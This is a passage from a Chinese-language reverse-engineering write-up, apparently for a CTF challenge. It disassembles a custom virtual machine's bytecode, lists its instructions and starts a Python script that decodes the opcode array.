class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">56</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">57</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">58</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">59</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span>             <span class="hljs-number">30</span>c0 <span class="hljs-number">0046</span><br>        <span class="hljs-attribute">f6f80103</span>         <span class="hljs-number">46000000</span> <span class="hljs-number">004</span>c mov vm_regs_0,vm_regs_0<br>        <span class="hljs-attribute">00000115</span> <span class="hljs-number">0050</span> mov vm_regs_1,vm_regs_21<br></code></pre></td></tr></table></figure><p>最后几条指令可能会有问题，不过并不重要。</p><p>有了机器码以及对应的汇编语句，现在翻译原来那一大堆指令也就比较简单了。而且通过对原伪代码分析，可以将信号分为四个类，</p><blockquote><p>case 4：mov 类</p><p>case 5：逻辑运算</p><p>case 8：比较</p><p>case 11: 跳转</p></blockquote><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>熟悉了机器码以及对应的汇编后，就可以开始进行反汇编它的opcode了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> c_int32<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>opcode = [<span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">204</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">204</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">48</span>, <span class="hljs-number">192</span>,<br>          <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">214</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,<br>          <span class="hljs-number">48</span>, <span class="hljs-number">192</span>,<br>          <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">70</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">225</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">161</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">204</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>,<br>          <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">92</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">1</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">150</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">236</span>, <span class="hljs-number">254</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">189</span>, <span class="hljs-number">254</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">99</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">150</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">250</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>,<br>          <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">69</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">154</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">201</span>, <span class="hljs-number">195</span>]<br><br>rip = <span class="hljs-number">0</span><br>vm_regs = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>cc_flag = <span class="hljs-number">0</span><br>cmp_flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> rip &gt;= <span class="hljs-built_in">len</span>(opcode):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 检查标志位</span><br>    <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">0xcc</span>:<br>        <span class="hljs-comment"># print(&#x27;cc&#x27;.rjust(16), end=&#x27; &#x27;)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> cc&#x27;</span>)<br>        cc_flag = <span class="hljs-number">1</span><br>        rip += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span> opcode[rip] == <span class="hljs-number">0x30</span> <span class="hljs-keyword">and</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">0xc0</span>:<br>        <span class="hljs-comment"># print(f&#x27;&#123;hex(48)[2:]&#125;&#123;hex(192)[2:]&#125;&#x27;.rjust(16), end=&#x27; &#x27;)</span><br>        <span class="hljs-built_in">print</span>(<span 